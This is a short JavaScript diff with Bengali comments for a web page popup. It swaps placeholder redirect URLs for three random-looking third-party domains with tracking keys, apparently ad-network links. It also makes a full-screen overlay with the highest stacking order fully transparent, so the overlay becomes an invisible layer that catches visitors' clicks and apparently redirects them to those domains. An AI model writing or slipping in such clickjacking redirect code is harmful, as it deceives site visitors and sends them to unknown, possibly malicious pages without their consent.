@@ -1,8 +1,8 @@
 // তিনটি URL
 const redirectLinks = [
-  "https://example.com/1",
-  "https://example.com/2",
-  "https://example.com/3"
+  "https://nickeldefiancepriest.com/pynxydkcf?key=9fcaaab1932732baaffa3314295d33af",
+  "https://pairturnnumerous.com/rze4wd8aa?key=74d74ecf1cacbe96436ceb718716741c",
+  "https://villagetraitgarret.com/fz3ifw9n?key=255cb9b54aebe1dca0f89408b47e3fcf"
 ];
 
 let currentIndex = 0; // কোন URL-এ যাবে ট্র্যাকের জন্য
@@ -15,7 +15,7 @@ popup.style.top = "0";
 popup.style.left = "0";
 popup.style.width = "100%";
 popup.style.height = "100%";
-popup.style.background = "rgba(0,0,0,0.5)";
+popup.style.background = "rgba(0,0,0,0.0)";
 popup.style.display = "none";
 popup.style.zIndex = "9999";
 popup.style.cursor = "pointer";
